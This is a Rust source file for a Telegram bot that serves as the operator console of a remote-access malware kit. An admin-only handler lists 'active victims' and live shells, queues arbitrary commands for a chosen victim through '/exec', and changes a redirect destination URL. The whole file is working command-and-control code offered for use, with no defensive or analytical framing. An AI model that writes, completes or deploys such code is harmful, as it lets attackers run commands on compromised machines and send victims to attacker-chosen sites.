use teloxide::{requests::Requester, prelude::*, payloads::SendMessageSetters, types::ParseMode::Html};
use std::sync::Arc;
use crate::AppState;

pub async fn run_bot(bot: Bot, state: Arc<AppState>) {

    // handler to listen all message sent to bot
    let handler = Update::filter_message().endpoint(
        |bot: Bot, state: Arc<AppState>, msg: Message| async move {
            
            let user_id = msg.from.as_ref().map(|u| u.id.0 as i64).unwrap_or(0);
            if user_id != state.admin_id { return Ok(()); }

            let text = msg.text().unwrap_or("");
            
            if text.starts_with("/help") || text.starts_with("/start") {
                bot.send_message(msg.chat.id, 
                    format!("/sessions - view active victims & stats\n/exec [id] [cmd] - run command on victim\n/redirect [URL] - set destination url\n/help - show help menu"))
                    .parse_mode(Html).await?;
            } 
            
            else if text.starts_with("/sessions") {
                
                let url = state.redirect.lock().unwrap().clone();
                let mut victimid = String::new();
                
                for v in state.shells.iter() {
                    let elapsed = v.value().elapsed().as_secs();
                    if elapsed < 30 {
                        victimid.push_str(&format!("{}\n", v.key()));
                    }
                }

                bot.send_message(msg.chat.id, format!("Redirect: {}\nActive Shells:\n{}", url, victimid)).parse_mode(Html).await?;
            } 
            
            else if text.starts_with("/exec") {
                
                let parts: Vec<_> = text.split_whitespace().collect();
                if parts.len() >= 3 {
                    let id = parts[1].to_string();
                    let cmd = parts[2..].join(" ");
                    state.command.insert(id.clone(), cmd);
                    bot.send_message(msg.chat.id, format!("command queued for: {}", id))
                        .parse_mode(Html).await?;
                }
            }
            
            else if text.starts_with("/redirect") {
                if let Some(u) = text.split_whitespace().nth(1) {
                    {
                        let mut lock = state.redirect.lock().unwrap();
                        *lock = u.to_string();
                    }
                    bot.send_message(msg.chat.id, format!("redirect updated: {}", u)).await?;
                }
            } 

            Ok::<(), teloxide::RequestError>(())
        },
    );

    Dispatcher::builder(bot, handler)
        .dependencies(dptree::deps![state])
        .enable_ctrlc_handler()
        .build()
        .dispatch()
        .await;
}
